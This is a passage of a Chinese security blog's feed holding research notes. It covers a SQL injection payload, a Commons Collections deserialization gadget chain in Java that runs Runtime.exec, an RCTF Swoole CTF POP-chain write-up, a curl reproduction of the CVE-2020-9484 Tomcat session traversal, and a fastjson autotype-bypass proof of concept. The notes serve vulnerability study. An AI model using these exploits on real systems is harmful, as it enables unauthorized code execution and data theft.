;a9&#x3D;9&amp;a9&#x3D;9&amp;id&#x3D;1%27%20or%20extractvalue%281,concat%280x7e,%28select%20table_name%20from%20information_schema.tables%20where%20table_schema&#x3D;%27dvwa%27%20limit%201,1%29,0x7e%29%29%23&amp;Submit&#x3D;Submit#</code></pre><p><img src="./image-20200616004738674.png" srcset="/img/loading.gif" alt="image-20200616004738674"></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><ol><li>一些权限问题，这里没有太注意，很多都是root，后面需要改进</li><li>网上waf也存在绕过，需要多学习些trick</li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://blog.oldboyedu.com/nginx-waf/" target="_blank" rel="noopener">https://blog.oldboyedu.com/nginx-waf/</a></p><p><a href="https://www.cnblogs.com/wushuaishuai/p/9315611.html" target="_blank" rel="noopener">https://www.cnblogs.com/wushuaishuai/p/9315611.html</a></p><p><a href="https://www.freesion.com/article/5916639317/" target="_blank" rel="noopener">https://www.freesion.com/article/5916639317/</a></p><p><a href="https://www.anquanke.com/post/id/103771" target="_blank" rel="noopener">https://www.anquanke.com/post/id/103771</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>环境</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CC链反序列化学习]TiedMapEntry利用链</title>
    <link href="/2020/06/09/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-TiedMapEntry%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <url>/2020/06/09/CC%E9%93%BE%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-TiedMapEntry%E5%88%A9%E7%94%A8%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="DEBUG"><a href="#DEBUG" class="headerlink" title="DEBUG"></a>DEBUG</h1><p>IDea debug 环境做个配置，要不会跑飞很迷</p><p><img src="./image-20200608172013246.png" srcset="/img/loading.gif" alt="image-20200608172013246"></p><h1 id="TiedMapEntry-hashcode"><a href="#TiedMapEntry-hashcode" class="headerlink" title="TiedMapEntry.hashcode"></a>TiedMapEntry.hashcode</h1><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<span class="hljs-keyword">import</span> java.util.HashMap;<span class="hljs-keyword">import</span> java.util.Map;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TiedMapEntryExec</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[] &#123;                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime<span class="hljs-class">.<span class="hljs-keyword">class</span>),</span>                new InvokerTransformer("getMethod", new Class[] &#123;                        String.class, Class[].class &#125;, new Object[] &#123;                        <span class="hljs-string">"getRuntime"</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"invoke"</span>, <span class="hljs-keyword">new</span> Class[] &#123;                        Object.class, Object[].class &#125;, new Object[] &#123;                        <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">"exec"</span>,                        new Class[] &#123; String[].class &#125;,new Object[]&#123;new String[]&#123;                        <span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"open /System/Applications/Calculator.app"</span>                &#125;&#125;)        &#125;;        Transformer tchain = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);        Map normalMap = <span class="hljs-keyword">new</span> HashMap();        Map lazyMap = LazyMap.decorate(normalMap,tchain);        TiedMapEntry tme = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap,<span class="hljs-keyword">null</span>);        tme.hashCode();    &#125;&#125;</code></pre><p>cc6前半段利用LazyMap.get调用Transform方法触发反序列化。后半段利用TiedMapEntry.hashCode()调用getValue方法</p><p><img src="./image-20200608172330455.png" srcset="/img/loading.gif" alt="image-20200608172330455"></p><p>为什么这里key可以是null或者任意值,</p><p>i=0调用需要返回<code>Runtime.class</code>,</p><p><img src="./image-20200608174956793.png" srcset="/img/loading.gif" alt="image-20200608174956793"></p><p>这里利用了new ConstantTransformer(Runtime.class)直接在调用transform返回iConstant,该值在实例化ConstantTransformer就进行了赋值，<em>所以当i=0与Object值无关及与key值无关</em>。</p><p><img src="./image-20200608175118524.png" srcset="/img/loading.gif" alt="image-20200608175118524"></p><h1 id="ConcurrenHashMap跳板构造"><a href="#ConcurrenHashMap跳板构造" class="headerlink" title="ConcurrenHashMap跳板构造"></a>ConcurrenHashMap跳板构造</h1><p>现在需要找到跳板，该跳板必须重写了readObject方法，且最后能够执行TiedEntryExec.hashCode()</p><p>简化调用栈如下</p><pre><code class="hljs java">ObjectInputStream.readObject  ConcurrentHashMap.readObject    TiedMapEntry.hashCode   <span class="hljs-comment">// 此处开始TiedMapEntry利用链</span>      TiedMapEntry.getValue        LazyMap.get         <span class="hljs-comment">// 此处开始LazyMap利用链</span></code></pre><p>跟进java.util.concurrent.ConcurrentHashMap.readObject()，在第1447调用hashCode，这里需要构造k为TiedMapEntry，才能触发利用链.</p><p><img src="./image-20200609004555963.png" srcset="/img/loading.gif" alt="image-20200609004555963"></p><p>K、V值由Node存储，发现putVal方法中实现对类参数table的赋值，可以通过反射构造K、V值。注意这里K不能直接构造为TiedMapEntry，会直接调用LazyMap.get()</p><p><img src="./image-20200609143104948.png" srcset="/img/loading.gif" alt="image-20200609143104948"></p><p>ConcurrenHashMap构造如下</p><pre><code class="hljs java">ConcurrentHashMap chm = <span class="hljs-keyword">new</span> ConcurrentHashMap(<span class="hljs-number">1</span>);        chm.put(<span class="hljs-string">"key"</span>,<span class="hljs-string">"value"</span>);        Field f = ConcurrentHashMap.class.getDeclaredField("table");        f.setAccessible(<span class="hljs-keyword">true</span>);<span class="hljs-comment">//反射获取ConcurrentHashMap.table参数，反射设置key值为tme</span>        Object[] table = (Object[])f.get(chm);        Object node = table[<span class="hljs-number">0</span>];        Field k = node.getClass().getDeclaredField(<span class="hljs-string">"key"</span>);        k.setAccessible(<span class="hljs-keyword">true</span>);        k.set(node,tme);</code></pre><h1 id="HashSet跳板构造"><a href="#HashSet跳板构造" class="headerlink" title="HashSet跳板构造"></a>HashSet跳板构造</h1><p>跟进HashSet.readObject，put方法只要控制e参数和map参数，就能调用TideMapEntry.HashCode()</p><p><img src="./image-20200609152733244.png" srcset="/img/loading.gif" alt="image-20200609152733244"></p><p>实际构造和ConcurrenHashMap类似，只不过这里需要对map值进行反射设置</p><pre><code class="hljs java">HashSet hashSet = <span class="hljs-keyword">new</span> HashSet(<span class="hljs-number">1</span>);<span class="hljs-comment">//直接add(tme)会执行TiedMapEntry.hashcode</span><span class="hljs-comment">//这里占个位,通过反射修改key</span>hashSet.add(<span class="hljs-string">"anything"</span>);Field setMap = hashSet.getClass().getDeclaredField(<span class="hljs-string">"map"</span>);setMap.setAccessible(<span class="hljs-keyword">true</span>);HashMap hashMap = (HashMap) setMap.get(hashSet);Field setTable = hashMap.getClass().getDeclaredField(<span class="hljs-string">"table"</span>);setTable.setAccessible(<span class="hljs-keyword">true</span>);Object[] table = (Object[]) setTable.get(hashMap);Object Node = table[<span class="hljs-number">1</span>];Field setKey = Node.getClass().getDeclaredField(<span class="hljs-string">"key"</span>);setKey.setAccessible(<span class="hljs-keyword">true</span>);setKey.set(Node,tme);</code></pre><h2 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h2><pre><code class="hljs css"><span class="hljs-selector-tag">Gadget</span> <span class="hljs-selector-tag">chain</span>:    <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.io</span><span class="hljs-selector-class">.ObjectInputStream</span><span class="hljs-selector-class">.readObject</span>()           <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashSet</span><span class="hljs-selector-class">.readObject</span>()               <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.put</span>()               <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.HashMap</span><span class="hljs-selector-class">.hash</span>()                   <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.hashCode</span>()                   <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span><span class="hljs-selector-class">.TiedMapEntry</span><span class="hljs-selector-class">.getValue</span>()                       <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span><span class="hljs-selector-class">.LazyMap</span><span class="hljs-selector-class">.get</span>()                           <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.ChainedTransformer</span><span class="hljs-selector-class">.transform</span>()                           <span class="hljs-selector-tag">org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.functors</span><span class="hljs-selector-class">.InvokerTransformer</span><span class="hljs-selector-class">.transform</span>()                           <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.reflect</span><span class="hljs-selector-class">.Method</span><span class="hljs-selector-class">.invoke</span>()                               <span class="hljs-selector-tag">java</span><span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.exec</span>()</code></pre><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/190468#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/190468#h3-8</a></p><p><a href="http://scz.617.cn:8/network/202003241127.txt" target="_blank" rel="noopener">http://scz.617.cn:8/network/202003241127.txt</a></p><p><a href="https://www.iteye.com/blog/bluepopopo-486548" target="_blank" rel="noopener">https://www.iteye.com/blog/bluepopopo-486548</a></p><p><a href="https://xz.aliyun.com/t/7029" target="_blank" rel="noopener">https://xz.aliyun.com/t/7029</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>JAVA反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CTF]2020RCTF Swoole题解学习笔记</title>
    <link href="/2020/06/02/CTF-2020RCTF-Swoole%E9%A2%98%E8%A7%A3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/06/02/CTF-2020RCTF-Swoole%E9%A2%98%E8%A7%A3%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="swoole"><a href="#swoole" class="headerlink" title="swoole"></a>swoole</h1><pre><code class="hljs php"><span class="hljs-comment">#!/usr/bin/env php</span><span class="hljs-meta">&lt;?php</span>Swoole\Runtime::enableCoroutine($flags = SWOOLE_HOOK_ALL);$http = <span class="hljs-keyword">new</span> Swoole\Http\Server(<span class="hljs-string">"0.0.0.0"</span>, <span class="hljs-number">9501</span>);$http-&gt;on(<span class="hljs-string">"request"</span>,    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-params">(Swoole\Http\Request $request, Swoole\Http\Response $response)</span> </span>&#123;        Swoole\Runtime::enableCoroutine();        $response-&gt;header(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/plain'</span>);        <span class="hljs-comment">// $response-&gt;sendfile('/flag');</span>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($request-&gt;get[<span class="hljs-string">'phpinfo'</span>])) &#123;            <span class="hljs-comment">// Prevent racing condition</span>            <span class="hljs-comment">// ob_start();phpinfo();</span>            <span class="hljs-comment">// return $response-&gt;end(ob_get_clean());</span>            <span class="hljs-keyword">return</span> $response-&gt;sendfile(<span class="hljs-string">'phpinfo.txt'</span>);        &#125;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($request-&gt;get[<span class="hljs-string">'code'</span>])) &#123;            <span class="hljs-keyword">try</span> &#123;                $code = $request-&gt;get[<span class="hljs-string">'code'</span>];                <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">'/\x00/'</span>, $code)) &#123;                    $a = unserialize($code);                    $a();                    $a = <span class="hljs-keyword">null</span>;                &#125;            &#125; <span class="hljs-keyword">catch</span> (\Throwable $e) &#123;                var_dump($code);                var_dump($e-&gt;getMessage());                <span class="hljs-comment">// do nothing</span>            &#125;            <span class="hljs-keyword">return</span> $response-&gt;end(<span class="hljs-string">'Done'</span>);        &#125;        $response-&gt;sendfile(<span class="hljs-keyword">__FILE__</span>);    &#125;);$http-&gt;start();</code></pre><p>以上代码执行反序列化，且会以函数的方式调用类，触发<code>__invoke</code>方法.全局搜索后在ObjectProxy中声明了该函数.且此处的利用可以实例化对象或通过<code>[对象,&#39;方法&#39;]</code>数组的形式调用类的无参数方法。</p><p><img src="./image-20200602015820440.png" srcset="/img/loading.gif" alt="image-20200602015820440"></p><p>在来看该题考点是利用反序列化修改PDO连接设置，将MYSQL_ATTR_LOCAL_INFILE赋值为1,允许外部读取客户端文件，利用此就能够使用Rouge MySQL Server接收local file。@zsx师傅发现这里若使用mysqli在设置配置参数之后不马上连接，数据库配置会丢失。（<a href="https://github.com/swoole/library/issues/34）" target="_blank" rel="noopener">https://github.com/swoole/library/issues/34）</a></p><p>反序列化思路</p><ol><li>实例化生成PDOPool实例</li><li>PDOPool 调用get方法连接数据库</li></ol><p><img src="./image-20200602013818665.png" srcset="/img/loading.gif" alt="image-20200602013818665"></p><p>首先反序列化操作是无法直接调用__construct魔术方法</p><p><img src="./image-20200602013926421.png" srcset="/img/loading.gif" alt="image-20200602013926421"></p><p>所以全局搜索到漏洞点，ConnectionPool::make方法中将类变量赋值如下，就能够调用<code>PDOPool::__construct</code></p><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;proxy=<span class="hljs-string">'new PDOPool'</span>;<span class="hljs-keyword">$this</span>-&gt;constructor=<span class="hljs-keyword">new</span> PDOConfig();</code></pre><p><img src="./image-20200601223955225.png" srcset="/img/loading.gif" alt="image-20200601223955225"></p><p>往上溯源<code>$this-&gt;proxy、$this-&gt;constructor</code>,发现make方法在该类的get函数中调用.这里也有个坑点，$this-&gt;pool原值为Channel类，底层限制了无法序列化。需要使用其他类代替且有pop函数。</p><p><img src="./image-20200602014439775.png" srcset="/img/loading.gif" alt="image-20200602014439775"></p><p>分析到这我的想法是直接通过<code>[new \Swoole\ConnectionPool(function () { }, 0, &#39;\\Swoole\\Database\\PDOPool&#39;),&#39;get&#39;]</code>直接调用<code>ConnectionPool::get</code>方法.通过此可以生成PDOPool实例，<strong>但是仅靠PDOPool和PDOConfig是无法建立数据连接</strong>。</p><p><img src="./image-20200602020313312.png" srcset="/img/loading.gif" alt="image-20200602020313312"></p><p>那要怎么样才能让新建的PDOPool实例，去连接数据库.</p><p>看swoole 提供的例子，可以看到<code>PDOPool</code>需要在调用一次<code>get()</code>方法，且这里需要传入<code>PDOProxy::class</code>才能够成功连接数据库。(这里看ConnectionPool的子类PDOproxy的构造方法)</p><p><img src="./image-20200602142424786.png" srcset="/img/loading.gif" alt="image-20200602142424786"></p><p>看EXP中的Part C部分。</p><p><img src="./image-20200602142840267.png" srcset="/img/loading.gif" alt="image-20200602142840267"></p><ol><li>以下两行会调用PDOProxy::reconnect函数，通过<code>$constructor()</code>能够调用<code>\Swoole\ConnectionPool::get()</code>函数，继而实例化出且重新赋值了__object为PDOPool实例.</li></ol><pre><code class="hljs php">changeProperty($d, <span class="hljs-string">'constructor'</span>, [$a, <span class="hljs-string">'get'</span>]);$curl-&gt;setOpt(CURLOPT_HEADERFUNCTION, [$d, <span class="hljs-string">'reconnect'</span>]);</code></pre><p><img src="./image-20200602143204049.png" srcset="/img/loading.gif" alt="image-20200602143204049"></p><ol start="2"><li>该行代码最终会执行PDOPool-&gt;get()连接数据库.($this-&gt;__object为PDOPool实例)</li></ol><pre><code class="hljs php">$curl-&gt;setOpt(CURLOPT_READFUNCTION, [$d, <span class="hljs-string">'get'</span>]);</code></pre><p><img src="./image-20200602144212131.png" srcset="/img/loading.gif" alt="image-20200602144212131"></p><h1 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h1><p><img src="./swoole.png" srcset="/img/loading.gif" alt="swoole"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol><li>如果在mysqli_real_connect之前设置mysql_option，其allow_local_infile的配置会被覆盖重写，其源代码限制修改就会无效.</li><li>反序列化时候关注extends 方法，由于该原理的存在，可以利用子父类的方法可以相互调用增加魔术方法调用的可能性</li><li>存在子父类情况，需要关注方法继承存在的利用</li><li><img src="./image-20200601215117226.png" srcset="/img/loading.gif" alt="image-20200601215117226"></li></ol><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2020/swoole</a></p><p><a href="https://www.anquanke.com/post/id/197518" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197518</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[CVE-2020-9484] Tomcat session单机持久化反序列化</title>
    <link href="/2020/05/27/CVE-2020-9484-Tomcat-session%E5%8D%95%E6%9C%BA%E6%8C%81%E4%B9%85%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/05/27/CVE-2020-9484-Tomcat-session%E5%8D%95%E6%9C%BA%E6%8C%81%E4%B9%85%E5%8C%96%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>当采用<code>PersistentManager</code>管理器处理session会存储在本地。对传入的SESSION值会在本地文件中加载，且路径可穿越。对读取到的session会进行反序列化且类加载器能够加载当前WEB-INF/lib中的危险类。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用师傅现成的环境:<a href="https://github.com/masahiro331/CVE-2020-9484.git" target="_blank" rel="noopener">https://github.com/masahiro331/CVE-2020-9484.git</a></p><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> https://github.com/masahiro331/CVE-2020-9484.git$ <span class="hljs-built_in">cd</span> CVE-2020-9484</code></pre><p>修改Dockerfile文件添加idea debug环境变量</p><p><img src="./image-20200527202428251.png" srcset="/img/loading.gif" alt="image-20200527202428251"></p><p>编译环境,映射web端口和debug端口</p><pre><code class="hljs bash">$ docker build -t tomcat:groovy .$ docker run -d -p 8083:8080  -p 5899:5899 tomcat:groovy</code></pre><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>Tomcat本身提供了许多Session管理器。当配置context.xml文件，session管理器类型为:PersistentManager类.如果session空闲时间过长，将空闲session转换为存储。</p><p><img src="./image-20200527202727398.png" srcset="/img/loading.gif" alt="image-20200527202727398"></p><p>获取session时候，会调用findSession先从内存中寻找session.</p><p><img src="./image-20200527203707811.png" srcset="/img/loading.gif" alt="image-20200527203707811"></p><p>当内存中寻找不到session,会到store获取。调用load方法,加载本地文件.</p><p><img src="./image-20200527203803113.png" srcset="/img/loading.gif" alt="image-20200527203803113"></p><p>最后调用readObjectData反序列化</p><p><img src="./image-20200527205551366.png" srcset="/img/loading.gif" alt="image-20200527205551366"></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><pre><code class="hljs bash">curl <span class="hljs-string">'http://localhost:8083/index.jsp'</span> -H <span class="hljs-string">'Cookie: JSESSIONID=../../../../../usr/local/tomcat/groovy'</span></code></pre><p><img src="./image-20200527205847544.png" srcset="/img/loading.gif" alt="image-20200527205847544"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://exploitcat.blog.csdn.net/article/details/88637270" target="_blank" rel="noopener">https://exploitcat.blog.csdn.net/article/details/88637270</a></p><p><a href="https://mp.weixin.qq.com/s/z5Lo93UXPCG0kNPcephI4Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z5Lo93UXPCG0kNPcephI4Q</a></p><p><a href="https://www.secpulse.com/archives/131630.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/131630.html</a></p><p><a href="https://c0okb.github.io/2020/05/25/CVE-2020-9484-Tomcat-cluster-sync-session-复现/#复现-1" target="_blank" rel="noopener">https://c0okb.github.io/2020/05/25/CVE-2020-9484-Tomcat-cluster-sync-session-%E5%A4%8D%E7%8E%B0/#%E5%A4%8D%E7%8E%B0-1</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Tomcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fastjson 1.2.68 绕过autotype(有限制)</title>
    <link href="/2020/05/16/fastjson-1-2-68-%E7%BB%95%E8%BF%87autotype-%E6%9C%89%E9%99%90%E5%88%B6/"/>
    <url>/2020/05/16/fastjson-1-2-68-%E7%BB%95%E8%BF%87autotype-%E6%9C%89%E9%99%90%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="fastJson"><a href="#fastJson" class="headerlink" title="fastJson"></a>fastJson</h1><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>fastjson 1.2.68</p><p>Jdk 1.8.202</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>设置@type的类首先能够在mapping中取出，在利用设置期望类，指定@type需要反序列化的类，就能够存入mapping中并实例化。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">poc</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;        String comment = <span class="hljs-string">"&#123;\"x\":&#123;\"@type\":\"java.lang.Exception\",\"@type\":\"org.openqa.selenium.WebDriverException\"&#125;,\"content\":&#123;\"$ref\":\"$x.systemInformation\"&#125;&#125;"</span>;        JSONObject jsonObject = JSON.parseObject(comment);        System.out.printf(jsonObject.getString(<span class="hljs-string">"content"</span>));    &#125;&#125;</code></pre><p>第一个@type 会检测checkautotype,如果直接使用<code>org.openqa.selenium.WebDriverException</code>会触发cheOutType 退出,那就需要绕过checkautoType，作者绕过就是使用了expectClass,设定第一个@type 为<code>java.lang.Exception</code></p><pre><code class="hljs angelscript"><span class="hljs-number">1.</span>白名单里的类<span class="hljs-number">2.</span>开启了 <span class="hljs-built_in">auto</span>type<span class="hljs-number">3.</span>使用了 JSONType 注解<span class="hljs-number">4.</span>指定了期望类（expectClass）<span class="hljs-number">5.</span>缓存 mapping 中的类</code></pre><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>fastjson遇到<code>@type</code>会进行反序列化，但是首先会经过一个checkAutoType检测，当置为<code>java.lang.Exception</code>时，能够从mapping中直接选中,继续返回class</p><p><img src="./image-20200516011817682.png" srcset="/img/loading.gif" alt="image-20200516011817682"></p><p>利用<code>java.lang.Exception</code>绕过checkAutoType后，会进行一次反序列化构造.</p><p><img src="./image-20200516010448219.png" srcset="/img/loading.gif" alt="image-20200516010448219"></p><p><code>java.lang.Exception</code>满足<code>Throwable</code>子类，生成<code>deserializer</code></p><p><img src="./image-20200516012357208.png" srcset="/img/loading.gif" alt="image-20200516012357208"></p><p>之后进入反序列化<code>org.openqa.selenium.WebDriverException</code></p><p><img src="./image-20200516000326748.png" srcset="/img/loading.gif" alt="image-20200516000326748"></p><p>经过scanSymbol 得到key 值为<code>@type</code>，满足<code>JSON.DEFAULT_TYPE_KEY.equals(key)</code>进入if 语句中.</p><p>通过<code>lexer.stringVal()</code>    截取json拿到字符串<code>org.openqa.selenium.WebDriverException</code></p><p><img src="./image-20200516000413120.png" srcset="/img/loading.gif" alt="image-20200516000413120"></p><p>跟进<code>checkAutoType</code>方法,如果第二个参数设置了期望对象.expectClassFlag会置为true,这对后续绕过checkAutoType检查很重要</p><p><img src="./image-20200516002047170.png" srcset="/img/loading.gif" alt="image-20200516002047170"></p><p>需要注意，依然会对<code>org.openqa.selenium.WebDriverException</code>进行黑名单检测</p><p><img src="./image-20200516003148044.png" srcset="/img/loading.gif" alt="image-20200516003148044"></p><p>接着会将<code>org.openqa.selenium.WebDriverException</code>装载进内存中</p><p><img src="./image-20200516003829331.png" srcset="/img/loading.gif" alt="image-20200516003829331"></p><p>最后直接看含有return 代码块中，这里由于设置了期望类，且该类为Throwable子类，能够成功返回该类。所以可以利用的类被限制在Throwable子类下.</p><p><img src="./image-20200516003439246.png" srcset="/img/loading.gif" alt="image-20200516003439246"></p><p>继续执行，经过<em>com/alibaba/fastjson/parser/deserializer/ThrowableDeserializer.java</em>第115行<code>createException</code></p><p><img src="./image-20200516004207289.png" srcset="/img/loading.gif" alt="image-20200516004207289"></p><p>跟进该方法,这里对<code>org.openqa.selenium.WebDriverException</code>进行实例化</p><p><img src="./image-20200516004357806.png" srcset="/img/loading.gif" alt="image-20200516004357806"></p><p>最后就会输出systemInformation结果，<code>\&quot;content\&quot;:{\&quot;$ref\&quot;:\&quot;$x.systemInformation\&quot;}</code>利用<code>$ref</code>去引用<code>@type</code>生成的实例方法,就能够调用getSystemInformation方法.</p><p><img src="./image-20200516005435666.png" srcset="/img/loading.gif" alt="image-20200516005435666"></p><h1 id="关于SET方法调用"><a href="#关于SET方法调用" class="headerlink" title="关于SET方法调用"></a>关于SET方法调用</h1><p>由于<code>org.openqa.selenium.WebDriverException</code>该类中没有set方法.如果能够找到Exction类中存在set方法.最后会在<em>com/alibaba/fastjson/parser/deserializer/ThrowableDeserializer.java</em>第149行调用.目前还没找到异常类set方法危险调用，先鸽</p><p><img src="./image-20200516005644719.png" srcset="/img/loading.gif" alt="image-20200516005644719"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/EXnXCy5NoGIgpFjRGfL3wQ</a></p><p><a href="https://www.anquanke.com/post/id/183197#h3-10" target="_blank" rel="noopener">https://www.anquanke.com/post/id/183197#h3-10</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>fastjson</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Android逆向]复现记录frida dump dex并hook</title>
    <link href="/2020/05/13/Android%E9%80%86%E5%90%91-%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95frida-dump-dex%E5%B9%B6hook/"/>
    <url>/2020/05/13/Android%E9%80%86%E5%90%91-%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95frida-dump-dex%E5%B9%B6hook/</url>
    
